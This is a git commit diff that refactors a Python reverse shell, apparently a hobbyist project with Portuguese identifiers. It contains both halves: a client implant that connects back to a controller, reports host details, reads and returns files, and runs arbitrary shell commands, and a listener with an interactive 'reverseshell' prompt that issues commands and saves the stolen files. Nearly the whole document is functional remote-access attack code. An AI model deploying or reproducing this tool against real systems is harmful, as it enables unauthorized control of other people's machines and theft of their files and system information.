8203a699fca7196ca50fa37c5c27bdb163f917dc
Joelalexandre560 <joelalexandreff@hotmail.com>
2019-02-08 02:42:52 +0000

    OOP/poo Update

--- bind.py
+++ bind.py
@@ -2,72 +2,159 @@ import os
 import socket
 import platform
 import subprocess
+from colorama import Fore, Back, Style, init
+init()
 
-os.system('title Cliente')
+class Cor:
 
-def criar_socket():
-    clientsocket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    criar_conection(clientsocket)
+    def __init__(self):
+        self.sucesso     = Style.BRIGHT + Back.GREEN + Fore.WHITE
+        self.aviso       = Style.BRIGHT + Back.YELLOW + Fore.BLACK
+        self.erro        = Style.BRIGHT + Back.RED + Fore.WHITE
+        self.inputs      = Style.BRIGHT + Back.CYAN + Fore.WHITE
+        self.pagina      = Style.BRIGHT + Back.WHITE + Fore.BLACK
+        self.epty        = Style.BRIGHT + Back.WHITE + Fore.BLACK
 
-def criar_conection(clientsocket):
-    try:
-        clientsocket.connect(('127.0.0.1',9999))
-    except ConnectionRefusedError:
-        print("Timeout ):")
-    else:
-        print("[!] Conetado (:")
-        comandos(clientsocket)
+        self.verde       = Style.BRIGHT + Fore.GREEN
+        self.amarelo     = Style.BRIGHT + Fore.YELLOW
+        self.vermelho    = Style.BRIGHT + Fore.RED
+        self.magenta     = Style.BRIGHT + Fore.MAGENTA
 
-def comandos(clientsocket):
-    while True:
-        message = clientsocket.recv(1024).decode('utf-8')
+        self.reset       = Style.RESET_ALL
 
-        if 'sair' in message:
-            print("A Encerrar...")
-            clientsocket.close()
-            break
-        elif 'limpar' in message:
-            os.system('cls')
-        elif 'infocliente' in message:
-            utilizador=str(os.getlogin())
-            nome_pc=str(platform.node())
-            sistema=str(platform.system())
-            os_ver=str(platform.release())
-            os_full_ver=str(platform.platform())
-            arquitetura=str(platform.architecture())
-            maquina=str(platform.machine())
-            cpu=str(platform.processor())
-            cpu_num=str(os.cpu_count())
-            info=("\nUtilizador: "+utilizador+"\nNome do PC: "+nome_pc+"\nSistema Operativo: "+sistema+" "+os_ver+"\nOS Versao: "+os_full_ver+"\nArquitetura: "+arquitetura+"\nMaquina: "+maquina+"\nProcessador: "+cpu+" "+cpu_num+" Cores")
-            clientsocket.send(str.encode(info))
-        elif 'chdir' in message:
-            try:
-                pasta=message[6:]
-                os.chdir(pasta)
-            except FileNotFoundError:
-                clientsocket.send(str.encode("Diretorio Nao Encontrado"))
-            else:
-                clientsocket.send(str.encode("Diretorio> "+os.system('CD')))
+    def Sucesso(self, texto):
+        return print(self.sucesso + texto + self.reset)
 
-        elif 'file' in message:
-            f_nome=message[5:]
-            try:
-                f=open(f_nome,"r")
-            except FileNotFoundError:
-                clientsocket.send(str.encode("Ficheiro Nao Encontrado"))
-            else:
-                f_data=f.read()
-                f.close()
-                clientsocket.send(str.encode(f_data))
+    def Aviso(self, texto):
+        return print(self.aviso + texto + self.reset)
+
+    def Erro(self, texto):
+        return print(self.erro + texto + self.reset)
+
+    def Inputs(self, texto):
+        return print(self.inputs + texto + self.reset)
+
+    def Mensagem(self, tipo, texto):
+        if tipo == 0:
+            return print(self.sucesso + '[+]' + self.reset, texto)
+        elif tipo == 1:
+            return print(self.aviso + '[!]' + self.reset, texto)
+        elif tipo == 2:
+            return print(self.erro + '[ ): ]' + self.reset, texto)
+        elif tipo == 3:
+            return print(self.inputs + '[->]' + self.reset, texto)
+
+
+class Plataforma:
+
+    def __init__(self):
+        self.Utilizador     = str(os.getlogin())
+        self.Nome_PC        = str(platform.node())
+        self.Sistema        = str(platform.system())
+        self.OS_Ver         = str(platform.release())
+        self.OS_Full_Ver    = str(platform.platform())
+        self.Arquitetura    = str(platform.architecture())
+        self.Maquina        = str(platform.machine())
+        self.CPU_           = str(os.cpu_count())
+        self.CPU_Num        = str(os.cpu_count())
+
+    def Mostrar_Info(self):
+        return "\nUtilizador: "+self.Utilizador+"\nNome do PC: "+self.Nome_PC+"\nSistema Operativo: "+self.Sistema+" "+self.OS_Ver+"\nOS Versao: "+self.OS_Full_Ver+"\nArquitetura: "+self.Arquitetura+"\nMaquina: "+self.Maquina+"\nProcessador: "+self.CPU_+" "+self.CPU_Num+" Cores"
+
+
+class SUBSHELL:
+
+    def Executar(self, modo, comando):
+
+        sub_proccess    = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        
+        raw_output      = sub_proccess.stdout.read() + sub_proccess.stderr.read()
+        str_output      = str(raw_output,'latin-1')
+
+        if modo == 0:
+            S.SOCKET.send(str.encode(str_output+'\n '))
+        elif modo == 1:
+            S.SOCKET.send(str.encode(str_output+'\n '))
+            print(str_output)
         else:
-            cmds = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            msgout = cmds.stdout.read() + cmds.stderr.read()
-            msgstr = str(msgout, 'latin-1')
+            Texto.Mensagem(1,'MODO 0 OR 1')
 
-            clientsocket.send(str.encode(msgstr + '\n'))
-            print(msgstr)
+
+class Cliente_SOCKET:
+
+    SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    def __init__(self):
+        self.InternetProtocol   = '127.0.0.1'
+        self.Porta              = 9999
+
+    def Preparar_Conection(self):
+        try:
+            self.SOCKET.connect((self.InternetProtocol, self.Porta))
+            Texto
+        except ConnectionRefusedError:
+            Texto.Mensagem(2,'Timeout')
+        else:
+            Texto.Mensagem(0,'Conetado (:')
+
+    def Comandos(self):
+        while True:
+
+            pacotes_rcv=self.SOCKET.recv(1024).decode('utf-8')
+
+            if 'sair' in pacotes_rcv:
+                Texto.Mensagem(1,'A Encerrar')
+                self.SOCKET.close()
+                break
+
+            elif 'limpar' in pacotes_rcv:
+                os.system('cls')
+
+            elif 'infocliente' in pacotes_rcv:
+                self.SOCKET.send(str.encode(Plat.Mostrar_Info()))
+
+            elif 'chdir' in pacotes_rcv:
+                diretorio=pacotes_rcv[6:]
+
+                try:
+                    os.chdir(diretorio)
+                except FileExistsError:
+                    self.SOCKET.send(str.encode('DIR_NA'))
+                except NotADirectoryError:
+                    self.SOCKET.send(str.encode('NOT_DIR'))
+                except OSError:
+                    self.SOCKET.send(str.encode('OS_ERR'))
+                else:
+                    self.SOCKET.send(str.encode(os.getcwd()))
+
+            elif 'file' in pacotes_rcv:
+                ficheiro_nome=pacotes_rcv[5:]
+
+                try:
+                    ficheiro=open(ficheiro_nome,'r')
+                except FileNotFoundError:
+                    S.SOCKET.send(str.encode('FILE_NF'))
+                except PermissionError:
+                    S.SOCKET.send(str.encode('NOT_FILE'))
+                else:
+                    ficheiro_dados=ficheiro.read()
+                    ficheiro.close()
+                    S.SOCKET.send(str.encode(ficheiro_dados))
+
+            else:
+                Shell.Executar(1,pacotes_rcv)
+
+
+Texto=Cor()
+Plat=Plataforma()
+S=Cliente_SOCKET()
+Shell=SUBSHELL()
 
 def main():
-    criar_socket()
+    S.Preparar_Conection()
+    S.Comandos()
 
 main()
+
+
+        
--- reverse.py
+++ reverse.py
@@ -3,103 +3,160 @@ import socket
 from colorama import Fore, Back, Style, init
 init()
 
-os.system('title Servidor')
+class Cor:
 
-def criar_socket(ip_servidor,porta):
-    serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    print('\n'+Style.BRIGHT+Back.GREEN+Fore.WHITE+'[+]'+Style.RESET_ALL+' Socket Criado')
-    criar_listener(serversocket, ip_servidor, porta)
+    def __init__(self):
+        self.sucesso     = Style.BRIGHT + Back.GREEN + Fore.WHITE
+        self.aviso       = Style.BRIGHT + Back.YELLOW + Fore.BLACK
+        self.erro        = Style.BRIGHT + Back.RED + Fore.WHITE
+        self.inputs      = Style.BRIGHT + Back.CYAN + Fore.WHITE
+        self.pagina      = Style.BRIGHT + Back.WHITE + Fore.BLACK
+        self.epty        = Style.BRIGHT + Back.WHITE + Fore.BLACK
 
-def criar_listener(serversocket,ip_servidor,porta):
-    serversocket.bind((ip_servidor, porta))
-    print('\n'+Style.BRIGHT+Back.GREEN+Fore.WHITE+'[+]'+Style.RESET_ALL+' IP e Porta Binded')
-    serversocket.listen(3)
-    print('\n'+Style.BRIGHT+Back.YELLOW+Fore.BLACK+'[...]'+Style.RESET_ALL+' A espera de um Cliente')
-    clientsocket,address = serversocket.accept()
-    cliente_address = str(address)
-    print('\n'+Style.BRIGHT+Back.GREEN+Fore.WHITE+'[!]'+Style.RESET_ALL+' O Cliente:',cliente_address,'entrou no Servidor\n[help - para mais informacao]')
-    comandos(clientsocket, address)
+        self.verde       = Style.BRIGHT + Fore.GREEN
+        self.amarelo     = Style.BRIGHT + Fore.YELLOW
+        self.vermelho    = Style.BRIGHT + Fore.RED
+        self.magenta     = Style.BRIGHT + Fore.MAGENTA
 
-def servidor():
-    ip_servidor = str(input(Style.BRIGHT+Fore.GREEN+'[->]'+Style.RESET_ALL+' IPv4 do Servidor: '))
-    porta = int(input(Style.BRIGHT+Fore.GREEN+'[->]'+Style.RESET_ALL+' Porta: '))
-    print('\n'+Style.BRIGHT+Back.YELLOW+Fore.BLACK+'[!]'+Style.RESET_ALL+' A Criar o Servidor')
-    criar_socket(ip_servidor,porta)
+        self.reset       = Style.RESET_ALL
 
-def comandos(clientsocket, address):
-    while True:
-        comando = input("\n"+Style.BRIGHT+Fore.GREEN+"reverseshell"+Fore.YELLOW+"@"+Fore.RED+address[0]+Fore.MAGENTA+"> "+Style.RESET_ALL)
+    def Sucesso(self, texto):
+        return print(self.sucesso + texto + self.reset)
 
-        if 'sair' in comando:
-            clientsocket.send(str.encode(comando))
-            clientsocket.close()
-            os.system('cls')
-            break
-        elif 'help' in comando:
-            _help()
-        elif 'limpar' in comando:
-            clientsocket.send(str.encode(comando))
-            os.system('cls')
-        elif 'infocliente' in comando:
-            clientsocket.send(str.encode(comando))
-            data_rcv=str(clientsocket.recv(1024),'utf-8')
-            print("Cliente",address)
-            print(data_rcv)
-        elif 'chdir' in comando:
-            if comando[6:] == '':
-                print("[!] chdir [DIRECTORY]")
+    def Aviso(self, texto):
+        return print(self.aviso + texto + self.reset)
+
+    def Erro(self, texto):
+        return print(self.erro + texto + self.reset)
+
+    def Inputs(self, texto):
+        return print(self.inputs + texto + self.reset)
+
+    def Mensagem(self, tipo, texto):
+        if tipo == 0:
+            return print(self.sucesso + '[+]' + self.reset, texto)
+        elif tipo == 1:
+            return print(self.aviso + '[!]' + self.reset, texto)
+        elif tipo == 2:
+            return print(self.erro + '[ ): ]' + self.reset, texto)
+        elif tipo == 3:
+            return print(self.inputs + '[->]' + self.reset, texto)
+
+
+class Grafico:
+
+    def Menu(self):
+        print(Texto.sucesso+'\n|-----ReverseShell-Menu-----|\n|---------------------------|'+Texto.pagina+'\n|  1 - Criar Servidor       |\n|  2 - Info                 |\n|  3 - Sair                 |\n|___________________________|\n'+Texto.reset)
+
+    def Ajuda(self):
+        print(Texto.sucesso+"\n|-------------------Help-Menu------------------|\n|----------------------------------------------|"+Texto.pagina+"\n|  limpar         ==  CMD:'CLS' BASH:'CLEAR'   |\n|  infocliente    ==  Informacao do Cliente    |\n|  sair           ==  Fecha Socket             |\n|                                              |\n|  chdir [FOLDER] ==  Troca Diretorio          |\n|  file [FILE]    ==  Obtém Dados do Ficheiro  |\n|______________________________________________|\n"+Texto.reset)
+
+
+class Servidor_SOCKET:
+
+    SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    def __init__(self, InternetProtocol, Porta):
+        self.InternetProtocol   = InternetProtocol
+        self.Porta              = Porta
+
+    def Preparar_SOCKET(self):
+        self.SOCKET.bind((self.InternetProtocol, self.Porta))
+        Texto.Mensagem(0,'IP e Porta Binded')
+        self.SOCKET.listen(1)
+        Texto.Mensagem(1,'A Espera de um Cliente no IPv4: '+self.InternetProtocol+' na Porta: '+str(self.Porta))
+
+    def Comandos(self):
+        CLIENTE, ENDERECO   = self.SOCKET.accept()
+        Cliente_Endereco    = str(ENDERECO)
+
+        Texto.Mensagem(0,'O Cliente: '+Cliente_Endereco+' entrou no Servidor\n\n      [help] - Para mais informacao\n')
+
+        while True:
+
+            comando = input('\n'+Texto.verde+'reverseshell'+Texto.amarelo+'@'+Texto.vermelho+ENDERECO[0]+Texto.magenta+'> '+Texto.reset)
+            
+            if comando != '':
+
+                if 'sair' in comando:
+                    CLIENTE.send(str.encode(comando))
+                    CLIENTE.close()
+                    os.system('cls')
+                    break
+
+                elif 'help' in comando:
+                    G.Ajuda()
+
+                elif 'limpar' in comando:
+                    CLIENTE.send(str.encode(comando))
+                    os.system('cls')
+
+                elif 'infocliente' in comando:
+                    CLIENTE.send(str.encode(comando))
+                    dados_rcv=str(CLIENTE.recv(1024),'utf-8')
+                    print('Cliente:',ENDERECO)
+                    print(dados_rcv)
+
+                elif 'chdir' in comando:
+                    if comando[6:] == '':
+                        Texto.Mensagem(2,'chdir [DIRETORIO]')
+                    else:
+                        CLIENTE.send(str.encode(comando))
+                        dados_rcv=str(CLIENTE.recv(1024),'utf-8')
+
+                        if 'DIR_NA' in dados_rcv:
+                            Texto.Mensagem(2,'Diretorio Nao Encontrado')
+                        elif 'NOT_DIR' in dados_rcv:
+                            Texto.Mensagem(2,'Nao e um Diretorio')
+                        elif 'OS_ERR' in dados_rcv:
+                            Texto.Mensagem(2,'OS_ERR    oof:/')
+                        else:
+                            print(dados_rcv)
+
+                elif 'file' in comando:
+                    if comando[5:] == '':
+                        Texto.Mensagem(2,'file [FICHEIRO]')
+                    else:
+                        ficheiro_nome=comando[5:]
+                        CLIENTE.send(str.encode(comando))
+                        dados_rcv=str(CLIENTE.recv(1024),'utf-8')
+                        if 'FILE_NF' in dados_rcv:
+                            Texto.Mensagem(2,'Ficheiro Nao Encontrado')
+                        elif 'NOT_FILE' in dados_rcv:
+                            Texto.Mensagem(2,'Sem Permissoes ou Nao e um Ficheiro')
+                        else:
+                            ficheiro=open('copia_'+ficheiro_nome,'w')
+                            ficheiro.write(dados_rcv)
+                            ficheiro.close()
+
+                else:
+                    CLIENTE.send(str.encode(comando))
+                    dados_rcv=str(CLIENTE.recv(1024),'utf-8')
+                    print(dados_rcv)
             else:
-                clientsocket.send(str.encode(comando))
-                data_rcv=str(clientsocket.recv(1024),'utf-8')
-                print(data_rcv)
-        elif 'file' in comando:
-            f_nome=comando[5:]
-            clientsocket.send(str.encode(comando))
-            data_rcv=str(clientsocket.recv(1024),'utf-8')
-            if 'Ficheiro Nao Encontrado' in data_rcv:
-                print(data_rcv)
-            else:
-                f=open("copia_"+f_nome,"w")
-                f.write(data_rcv)
-                f.close()
-        else:
-            clientsocket.send(str.encode(comando))
-            msg_rcv = str(clientsocket.recv(1024), 'utf-8')
-            print(msg_rcv)
+                pass
 
-def menu():
-    os.system('cls')
-    print(" ___________________________\n|"
-        +Style.BRIGHT+Back.GREEN+Fore.WHITE+"-----ReverseShell-Menu-----"+Style.RESET_ALL+
-        "|\n|"+Style.BRIGHT+Back.GREEN+Fore.WHITE+"---------------------------"+Style.RESET_ALL+
-        "|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"  1 - Criar Servidor       "+Style.RESET_ALL+
-        "|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"  2 - Info                 "+Style.RESET_ALL+
-        "|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"  3 - Sair                 "+Style.RESET_ALL+
-        "|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"___________________________"+Style.RESET_ALL+"|\n")
 
-def _help():
-    print(" ______________________________________________\n|"
-        +Style.BRIGHT+Back.GREEN+Fore.WHITE+"-------------------Help-Menu------------------"+Style.RESET_ALL+
-        "|\n|"+Style.BRIGHT+Back.GREEN+Fore.WHITE+"----------------------------------------------"+Style.RESET_ALL+
-        "|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"  limpar         ==  CMD:'CLS' BASH:'CLEAR'   "+Style.RESET_ALL+
-        "|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"  infocliente    ==  Informacao do Cliente    "+Style.RESET_ALL+
-        "|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"  sair           ==  Fecha Socket             "+Style.RESET_ALL+
-        "|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"                                              "+Style.RESET_ALL+
-        "|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"  chdir [FOLDER] ==  Troca Diretorio          "+Style.RESET_ALL+
-        "|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"  file [FILE]    ==  Obtém Dados do Ficheiro  "+Style.RESET_ALL+
-        "|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"______________________________________________"+Style.RESET_ALL+"|\n")
+Texto=Cor()
+G=Grafico()
 
 def main():
     while True:
-        menu()
+        G.Menu()
         opcao = str(input('Selecione uma opcao> '))
 
         if '1' in opcao:
             os.system('cls')
-            servidor()
+            IP=str(input(Texto.inputs+'[->]'+Texto.reset+' IPv4: '))
+            PORTA=int(input(Texto.inputs+'[->]'+Texto.reset+' PORTA: '))
+            S=Servidor_SOCKET(IP,PORTA)
+            S.Preparar_SOCKET()
+            S.Comandos()
+
         elif '2' in opcao:
             os.system('cls')
-            print('Developer: Joeru\n')
+            print('Developer: Joeru'+Texto.epty+'<3'+Texto.reset)
+            print('Github Profile: https://github.com/Joerito\n')
             os.system('pause')
             os.system('cls')
         elif '3' in opcao:
